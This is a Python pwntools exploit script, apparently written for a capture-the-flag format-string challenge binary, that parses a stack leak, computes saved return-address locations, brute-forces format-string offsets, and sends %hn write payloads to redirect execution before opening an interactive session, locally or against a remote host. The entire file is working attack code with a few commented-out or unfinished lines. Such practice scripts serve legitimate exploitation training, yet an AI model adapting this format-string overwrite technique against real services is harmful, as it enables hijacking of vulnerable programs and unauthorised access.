from pwn import *
import sys

BINARY = "chall_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(env={"LD_PRELOAD": "./libc.so.6 ./ld-linux-x86-64.so.2"})
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def get_leak(self):
        p = self.p
        p.recvuntil(b"Secret leak ")
        return eval(p.recvline().strip())

    def send(self, content):
        p = self.p
        p.sendlineafter(b"> ", content)


def brute():
    with context.silent:
        for i in range(100):
            try:
                x, p = init()
                p.recvuntil(b"Secret")
                x.send(f"%{i}$XlAAAAAAAAAAAAAAAAAAAAAAAAAA")
                print(i)
                print(p.recvline())
            except:
                pass


def main():
    x, p = init()
    leak = x.get_leak()
    
    saved_rip_vuln = leak - 0x18
    saved_rip_main = leak + 0x18
    stack_idx_6 = leak - 0x80
    stack_idx_32 = stack_idx_6 + (32-6)*8
    stack_idx_47 = stack_idx_6 + (47-6)*8

    log.info(f"{leak=:x}")
    log.info(f"{saved_rip_vuln=:x}")
    log.info(f"{saved_rip_main=:x}")
    log.info(f"{stack_idx_6=:x}")
    log.info(f"{stack_idx_32=:x}")
    log.info(f"{stack_idx_47=:x}")
    log.info(f"normal stack layout: {stack_idx_32:x} -> {stack_idx_47:x}")
    log.info(f"target stack layout: {stack_idx_32:x} -> {saved_rip_vuln:x}")
    
    
    
    
    x.debug("""
            break *vuln+134
            break *vuln+92
            c
            """)

    pay = b''
    pay += "%{}c%11$hnn".format((exe.sym['main']+152+100)&0xff).encode()
    pay += "%{}c%12$hnn".format((saved_rip_vuln&0xffff) - (exe.sym['main']+152&0xff)).encode()
    pay += b"||%25$p|%27$p|"
    pay = pay.ljust(8*5, b"#") # 6 - 10
    # pay += p64(saved_rip_vuln)
    # pay += p64(stack_idx_32)
    
    log.info(f"payload lenght: {len(pay)}")
    x.send(pay)
    
    
    
    pay = b"%X"
    x.send(pay)
    
    p.interactive()

# brute()
main()